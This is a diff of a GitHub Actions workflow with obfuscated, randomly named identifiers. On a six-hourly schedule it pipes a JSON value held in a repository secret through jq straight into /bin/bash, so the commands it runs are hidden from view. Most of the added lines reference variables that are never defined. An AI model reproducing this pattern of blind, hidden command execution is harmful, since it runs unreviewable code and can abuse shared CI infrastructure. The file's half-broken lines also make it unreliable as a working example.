@@ -3,17 +3,24 @@ name: wendixiang9772
 on:
   workflow_dispatch:
   schedule:
-    - cron: '13 2/6 * * *'
+    - cron: '12 4/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: wendixiang9772
         env:
-          kyto7000: ${{ secrets.kyto7000 }}
+          jpr84: ${{ secrets.jpr84 }}
         run: |
-          echo $kyto7000 | jq -r .wwbla95 | /bin/bash
-          echo $j058 | jq -r .alm4370 | /bin/bash
+          echo $jpr84 | jq -r .pb71330 | /bin/bash
+          echo $q03 | jq -r .clv0122 | /bin/bash
+          echo $fm3 | jq -r .eb68 | /bin/bash
+          echo $kvrsq854 | jq -r .vs570 | /bin/bash
+          echo $cfa7 | jq -r .su468 | /bin/bash
+          echo $tatmw0 | jq -r .cds092 | /bin/bash
+          echo $xpoed7 | jq -r .xbju1709 | /bin/bash
+          echo $bf97 | jq -r .bndah653 | /bin/bash
 
